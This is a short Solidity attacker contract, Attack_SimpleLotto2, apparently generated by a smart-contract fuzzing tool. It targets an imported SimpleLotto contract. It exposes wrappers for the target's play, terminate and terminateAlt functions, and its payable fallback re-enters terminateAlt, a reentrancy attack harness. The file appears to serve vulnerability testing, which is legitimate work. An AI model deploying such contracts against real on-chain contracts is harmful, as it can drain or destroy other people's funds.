pragma solidity ^0.4.19;

import "./SimpleLotto.sol";

contract Attack_SimpleLotto2 {

  SimpleLotto public target_contract;

  function Attack_SimpleLotto2(address _targetContract) public payable {
      target_contract = SimpleLotto(_targetContract);
  } 

  function vultron_play(uint256 vultron_amount, address receiver, uint256 amount) public {
    target_contract.play.value(vultron_amount)(receiver, amount);
  } 
  //function vultron_play(address receiver, uint256 amount) public {
   // target_contract.play(receiver, amount);
  //} 

  function vultron_terminate() public {
    target_contract.terminate();
  } 

  function vultron_terminateAlt() public {
    target_contract.terminateAlt();
  } 

      function() public payable {
        
        target_contract.terminateAlt();
      }
      } 
